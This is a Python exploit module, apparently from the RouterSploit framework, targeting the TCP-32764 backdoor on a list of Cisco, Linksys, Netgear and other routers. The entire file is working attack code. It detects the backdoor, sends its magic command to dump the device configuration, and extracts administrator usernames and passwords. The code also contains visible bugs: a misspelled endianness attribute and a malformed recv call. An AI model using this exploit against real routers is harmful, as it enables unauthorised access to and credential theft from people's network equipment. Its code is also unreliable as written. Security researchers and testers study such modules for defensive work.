import struct
import re
from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "TCP-32764 Info Disclosure",
        "description": "Exploits backdoor functionality that allows fetching "
                       "credentials for administrator user.",
        "authors": (
            "Eloi Vanderbeken",  # vulnerability discovery & proof of concept exploit
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/elvanderb/TCP-32764",
        ),
        "devices": (
            "Cisco RVS4000 fwv 2.0.3.2 & 1.3.0.5",
            "Cisco WAP4410N",
            "Cisco WRVS4400N",
            "Cisco WRVS4400N",
            "Diamond DSL642WLG / SerComm IP806Gx v2 TI",
            "LevelOne WBR3460B",
            "Linksys RVS4000 Firmware V1.3.3.5",
            "Linksys WAG120N",
            "Linksys WAG160n v1 and v2",
            "Linksys WAG200G",
            "Linksys WAG320N",
            "Linksys WAG54G2",
            "Linksys WAG54GS",
            "Linksys WRT350N v2 fw 2.00.19",
            "Linksys WRT300N fw 2.00.17",
            "Netgear DG834",
            "Netgear DGN1000",
            "Netgear DGN2000B",
            "Netgear DGN3500",
            "Netgear DGND3300",
            "Netgear DGND3300Bv2 fwv 2.1.00.53_1.00.53GR",
            "Netgear DM111Pv2",
            "Netgear JNR3210",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(32764, "Target TCP port")

    def __init__(self):
        self.endianness = "<"

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            conf = self.get_config()

            lines = re.split("\x00|\x01", conf)
            pattern = re.compile('user(name)?|password|login')

            credentials = []

            for line in lines:
                try:
                    (var, value) = line.split("=")
                    if len(value) > 0 and pattern.search(var):
                        credentials.append((var, value))
                except ValueError:
                    continue

            if credentials:
                print_table(("Parameter", "Value"), *credentials)
        else:
            print_error("Target is not vulnerable")

    def get_config(self):
        # 0x53634D4D - backdoor code
        # 0x01  - 1 - get config
        headers = struct.pack(self.endianness + "III", 0x53634D4D, 0x01, 0x01)
        payload = headers + b"\x00"

        tcp_client = self.tcp_create()
        if tcp_client.connect():
            tcp_client.send(payload)
            response = tcp_client.recv(0xC)

            if response:
                sig, ret_val, ret_len = struct.unpack(self.endianness + "III", response)
                response = tcp_client.recv(tcp_client, ret_len)

                tcp_client.close()

                if response:
                    return str(response, "utf-8")

        return ""

    @mute
    def check(self):
        tcp_client = self.tcp_create()
        if tcp_client.connect():
            tcp_client.send(b"ABCDE")
            response = tcp_client.recv(5)
            tcp_client.close()

            if response:
                if response.startswith(b"MMcS"):
                    self.endianness = ">"  # BE
                elif response.startswith(b"ScMM"):
                    self.endinaness = "<"  # LE

                return True  # target is vulnerable

        return False  # target is not vulnerable
